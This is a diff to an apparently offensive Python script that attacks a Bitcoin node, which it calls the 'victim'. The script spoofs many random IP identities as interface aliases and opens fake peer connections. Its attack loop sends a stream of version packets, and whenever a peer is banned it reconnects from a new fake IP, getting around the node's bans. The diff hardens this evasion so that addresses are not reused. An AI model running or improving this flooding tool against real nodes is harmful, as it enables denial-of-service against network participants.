@@ -42,11 +42,15 @@ def bitcoin(cmd):
 # Generate a random identity using the broadcast address template
 def random_ip():
 	#return f'10.0.{str(random.randint(0, 255))}.{str(random.randint(0, 255))}'
-	ip = broadcast_address
-	old_ip = ''
-	while(old_ip != ip):
-		old_ip = ip
-		ip = ip.replace('255', str(random.randint(0, 255)), 1)
+	while(True):
+		ip = broadcast_address
+		old_ip = ''
+		while(old_ip != ip):
+			old_ip = ip
+			ip = ip.replace('255', str(random.randint(0, 255)), 1)
+		# Don't accept already assigned IPs
+		if ip not in [x[0] for x in identity_address]:
+			break
 	return ip
 
 # Create an alias for a specified identity
@@ -71,21 +75,13 @@ def version_packet(src_ip, dst_ip, src_port, dst_port):
 	return msg
 
 # Close a connection
-def close_connection(index):
-	if index < 0 and index >= len(identity_socket):
-		print('Error: Failed to close connection')
-		return
-	ip, port = identity_address[index]
-	interface = identity_interface[index]
-	socket = identity_socket[index]
-
-	del identity_address[index]
-	del identity_socket[index]
-	del identity_interface[index]
-
+def close_connection(socket, ip, port, interface):
 	socket.close()
 	terminal(f'sudo ifconfig {interface} {ip} down')
 
+	identity_socket.remove(socket)
+	identity_interface.remove(interface)
+	identity_address.remove((ip, port))
 	print(f'Successfully closed connection to ({ip} : {port})')
 
 # Creates a fake connection to the victim
@@ -134,8 +130,6 @@ def make_fake_connection(src_ip, dst_ip, verbose=True):
 	identity_address.append((src_ip, src_port))
 	identity_socket.append(s)
 
-	index = len(identity_socket) - 1
-
 	# Listen to the connections for future packets
 	if verbose: print('Attaching attacker script {interface}')
 	try:
@@ -145,19 +139,18 @@ def make_fake_connection(src_ip, dst_ip, verbose=True):
 			'src_port': src_port,
 			'dst_ip': dst_ip,
 			'dst_port': dst_port,
-			'interface': interface,
-			'index': index 
+			'interface': interface
 		})
 	except:
 		print('Error: unable to  start thread to sniff interface {interface}')
 
-def attack(socket, src_ip, src_port, dst_ip, dst_port, interface, index):
+def attack(socket, src_ip, src_port, dst_ip, dst_port, interface):
 	while True:
 		try:
 			socket.send(version_packet(src_ip, dst_ip, src_port, dst_port).to_bytes())
 		except:
+			close_connection(socket, src_ip, src_port, interface)
 			print(f'Peer was banned ({src_ip} : {src_port})')
-			close_connection(index)
 			make_fake_connection(random_ip(), dst_ip, False)
 
 # Called when
